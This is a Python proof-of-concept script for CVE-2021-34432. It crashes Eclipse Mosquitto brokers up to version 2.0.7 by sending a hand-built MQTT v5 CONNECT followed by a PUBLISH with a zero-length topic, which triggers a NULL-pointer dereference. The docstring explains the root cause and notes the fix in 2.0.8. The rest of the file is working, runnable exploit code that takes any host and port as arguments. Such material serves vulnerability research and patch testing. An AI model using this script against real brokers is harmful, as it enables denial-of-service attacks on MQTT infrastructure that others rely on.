#!/usr/bin/env python3
"""
CVE-2021-34432 PoC - Eclipse Mosquitto <= 2.0.7 NULL-pointer dereference in the
broker PUBLISH handler when an MQTT v5 client sends a PUBLISH with a
zero-length topic.

Root cause (src/handle_publish.c, v2.0.7):
    packet__read_string(&in_packet, &msg->topic, &slen);   # slen == 0 -> topic NULL
    if(!slen && context->protocol != mosq_p_mqtt5){ ... }  # v5 SKIPS this reject
    ...
    mosquitto_pub_topic_check(msg->topic)                  # topic == NULL -> deref
v2.0.8 fixed mosquitto_pub_topic_check()/_sub_topic_check() to return
MOSQ_ERR_INVAL when topic == NULL.

We hand-roll the MQTT v5 frames (no paho needed): an MQTT 5.0 CONNECT, then a
PUBLISH (QoS 0) whose topic-name length field is 0x0000.

Usage: python3 poc_cve_2021_34432.py [host] [port]
"""
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883


def remaining_length(n: int) -> bytes:
    """MQTT variable-length integer."""
    out = b""
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        out += bytes([byte])
        if n == 0:
            break
    return out


def mqtt5_connect(client_id: str = "poc34432") -> bytes:
    # Variable header: protocol name "MQTT", level 5, flags=clean start, keepalive 60
    vh = b"\x00\x04MQTT" + b"\x05" + b"\x02" + struct.pack(">H", 60)
    vh += b"\x00"  # CONNECT properties length = 0
    # Payload: client id
    cid = client_id.encode()
    payload = struct.pack(">H", len(cid)) + cid
    body = vh + payload
    return bytes([0x10]) + remaining_length(len(body)) + body


def mqtt5_publish_zero_topic() -> bytes:
    # Fixed header: PUBLISH, QoS 0, no DUP/retain -> 0x30
    # Variable header: topic length = 0x0000 (the trigger), then v5 properties len = 0
    vh = struct.pack(">H", 0) + b"\x00"   # zero-length topic + 0 properties
    payload = b"x"                        # any payload
    body = vh + payload
    return bytes([0x30]) + remaining_length(len(body)) + body


def main() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))

    conn = mqtt5_connect()
    print(f"[*] -> MQTT5 CONNECT ({len(conn)} B)")
    s.sendall(conn)
    try:
        connack = s.recv(64)
        print(f"[*] <- CONNACK {connack.hex()}")
    except Exception as e:
        print(f"[!] no CONNACK: {e}")

    pub = mqtt5_publish_zero_topic()
    print(f"[*] -> MQTT5 PUBLISH zero-length topic ({len(pub)} B) {pub.hex()}")
    s.sendall(pub)
    print("[*] sent (expect broker NULL-deref / SIGSEGV in mosquitto_pub_topic_check"
          " via handle__publish)")
    try:
        s.recv(64)
    except Exception:
        pass
    s.close()


if __name__ == "__main__":
    main()
